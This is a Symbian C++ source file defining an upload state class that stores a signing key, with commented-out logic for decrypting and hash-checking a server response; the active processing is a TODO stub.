/*
 * StateUpload.cpp
 *
 *  Created on: 27/feb/2011
 *      Author: Giovanna
 */
#include "StateUpload.h"
#include "Keys.h"
#include "AdditionalDataStructs.h"
#include <HT\LogFile.h>
#include <HT\ShaUtils.h>
#include <HT\AES.h>
#include <HT\RESTUtils.h>
#include <HT\FileUtils.h>



CStateUpload::CStateUpload(MStateObserver& aObserver) : CAbstractState(EState_Upload, aObserver)
	{
	// No implementation required
	}

CStateUpload::~CStateUpload()
	{
	delete iRequestData;
	delete iResponseData;
	}

CStateUpload* CStateUpload::NewLC(MStateObserver& aObserver)
	{
	CStateUpload* self = new (ELeave) CStateUpload(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStateUpload* CStateUpload::NewL(MStateObserver& aObserver)
	{
	CStateUpload* self = CStateUpload::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStateUpload::ConstructL()
	{
	}

void CStateUpload::ActivateL(const TDesC8& aData)
	{
	// Parameter aData stores the K key
	iSignKey.Copy(aData);
	
	//TODO: implement request
	ProcessDataL(KNullDesC8);
	}

void CStateUpload::ProcessDataL(const TDesC8& aData) 
	{
	/*
	//free resources
	delete iRequestData;
	iRequestData = NULL;
		
	if(aData.Size()!=0)
		{
		if(iResponseData == NULL)
			{
			iResponseData = aData.AllocL();
			}
		else
			{
			TInt size = iResponseData->Size();
			iResponseData = iResponseData->ReAllocL(size+aData.Size()); //TODO:check the result of allocation
			iResponseData->Des().Append(aData);
			}
			return;
		}
			
	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
		{
		//server answered with a redirect
		iObserver.ResponseError(KErrContent);
		return;
		}
			
	//extract body from response
	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
	body.CleanupClosePushL();
		
	RBuf8 plainBody(AES::DecryptPkcs5L(body,KIV,iSignKey));
	CleanupStack::PopAndDestroy(&body);
	plainBody.CleanupClosePushL();
	//check sha1
	if(!ShaUtils::ValidateSha(plainBody.Left(plainBody.Size()-20),plainBody.Right(20)))
		{
		CleanupStack::PopAndDestroy(&plainBody);
		iObserver.ResponseError(KErrSha);
		return;
		}
		*/
	/*
	//check response
	if(plainBody.Left(4).Compare(KProto_Ok) == 0)
		{
		FindFilesL(plainBody.Right(plainBody.Size()-8),iFilesArray);  //8=KProto_Ok|len
		}
	CleanupStack::PopAndDestroy(&plainBody);
	if(iFilesArray->Count()>0)
		{
		iFileIndex = 0;
		iLongTask->NextRound();
		}
	else
		iObserver.ChangeStateL();
		*/
	//TODO: implement process data
	iObserver.ChangeStateL();
	}

